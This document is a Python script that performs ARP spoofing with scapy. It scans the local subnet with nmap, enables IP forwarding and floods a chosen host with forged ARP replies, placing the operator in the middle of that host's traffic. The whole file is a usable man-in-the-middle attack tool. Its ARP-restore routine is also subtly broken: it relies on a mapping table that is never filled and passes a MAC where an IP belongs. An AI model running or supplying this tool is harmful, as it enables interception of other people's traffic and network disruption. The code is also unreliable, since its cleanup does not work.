#!/usr/bin/env python
import scapy.all as scapy
import subprocess
import re
import sys

original_mappings = {}

def enable_ip_forwarding():
    subprocess.call(["sysctl", "-w", "net.ipv4.ip_forward=1"])
    print("IPv4 forwarding enabled.")

def disable_ip_forwarding():
    subprocess.call(["sysctl", "-w", "net.ipv4.ip_forward=0"])
    print("IPv4 forwarding disabled.")

def get_local_ip():
    # Execute 'ip route show' command to get the local IP address
    route_result = subprocess.check_output(["ip", "route", "show"]).decode("utf-8")
    local_ip = route_result.split(" ")[8]
    return local_ip

def get_router_ip():
    # Execute 'ip route show' command to get the router's IP address
    route_result = subprocess.check_output(["ip", "route", "show", "default"]).decode("utf-8")
    for line in route_result.split("\n"):
        if "default via" in line:
            router_ip = line.split(" ")[2]
            return router_ip
    return None

def get_network_hosts(ip):
    # Execute 'nmap' command to discover hosts in the network
    nmap_command = ["nmap", "-sn", "-PR", ip + "/24"]
    nmap_result = subprocess.check_output(nmap_command).decode("utf-8")
    hosts = re.findall(r"(\d+\.\d+\.\d+\.\d+)", nmap_result)
    return hosts

def get_target_mac(ip):
    # Create an ARP request packet to get the target MAC address
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request

    # Send the packet and capture the response
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    # Return the MAC address of the first response
    if answered_list:
        return answered_list[0][1].hwsrc

def spoof_arp(target_ip, target_mac, spoof_ip):
    # Create an ARP response packet to spoof the target
    arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)

    # Send the packet
    scapy.send(arp_response, verbose=False)

def restore_arp():
    for target_ip, original_mac in original_mappings.items():
        target_mac = get_target_mac(target_ip)
        if target_mac is not None:
            arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=original_mac)
            scapy.send(arp_response, verbose=False)

def main():
    local_ip = get_local_ip()
    print("Local IP:", local_ip)
    router_ip = get_router_ip()
    print("Router IP:", router_ip)
    network_hosts = get_network_hosts(router_ip)

    if len(network_hosts) == 0:
        print("No hosts found in the network.")
        return

    print("Network Hosts:")
    for index, host in enumerate(network_hosts):
        print(f"{index + 1}. {host}")

    target_index = int(input("Enter the index of the target IP: ")) - 1
    spoof_index = int(input("Enter the index of the IP to spoof: ")) - 1

    target_ip = network_hosts[target_index]
    spoof_ip = network_hosts[spoof_index]

    target_mac = get_target_mac(target_ip)
    if target_mac is None:
        print("Unable to get target MAC address. Exiting.")
        return

    print("Target IP:", target_ip)
    print("Target MAC address:", target_mac)

    try:
        enable_ip_forwarding()
        while True:
            spoof_arp(target_ip, target_mac, spoof_ip)
            print("ARP packet sent. Spoofing", target_ip, "with", spoof_ip)
    except KeyboardInterrupt:
        print("\nRestoring ARP mappings...")
        restore_arp()
        disable_ip_forwarding()
        print("ARP spoofing stopped.")
        sys.exit(0)

if __name__ == "__main__":
    main()
